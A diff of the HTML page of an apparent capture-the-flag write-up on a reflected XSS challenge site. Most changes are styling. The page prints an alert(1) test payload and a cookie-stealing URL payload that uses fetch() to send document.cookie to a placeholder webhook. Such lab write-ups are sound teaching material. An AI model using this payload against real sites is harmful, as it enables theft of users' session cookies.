@@ -6,7 +6,7 @@
     <meta http-equiv="X-UA-Compatible" content="ie=edge">
     <title>Contents</title>
     <link rel="stylesheet" href="../../styles.css">
-    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.9.0/styles/default.min.css">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.9.0/styles/stackoverflow-dark.css">
   </head>
   <body id="postBody">
 
@@ -25,9 +25,9 @@
       The site, <a href="https://homework-xss.acmcyber.com/" 
       target="_blank"> homework-xss.acmcyber.com</a>, is 
       vulnerable to reflected XSS. If the field is filled with 
-      simple html javascript <code style="background-color: 
-      rgba(0, 0, 0, 0.103); color: rgb(80, 80, 80)">
-      &lt;script&gt; alert(1) &lt;/script&gt; </code>
+      simple html javascript <code class="language-html" style=
+      "color:rgb(14, 14, 14); background-color: grey;">
+      &lt;script&gt; alert(1) &lt;/script&gt;</code>
       a popup is triggered when submitted. The idea is to get
       the flag which is usually stored as a cookie on the victims
       browser. 
@@ -46,14 +46,12 @@
       url uses a javascript template literal to insert the bot's 
       cookie into the url parameter of the webhook url when the bot
       visits the url.
-      <pre>
-        <code class="language-plaintext" style="background-color: rgba(0, 0, 0, 0.103);">
+      <pre><code class="language-html">
 https://homework-xss.acmcyber.com/hw?submission=
 &lt;script&gt;fetch(`[WEBHOOK_SITE_URL]/?q=${document.cookie}`)&lt;/script&gt;
-        </code>
-      </pre>
-      <img src="../../images/xss3.png" style="width:95%;">
-      <br><br><br>
+        </code></pre>
+      <img src="../../images/xss3.png" style="width:100%;">
+      <br><br>
       This cookie is then viewable through webhook as value of the "q" query parameter.
       <img src="../../images/xss4.png" style="width:95%;">
     </div>
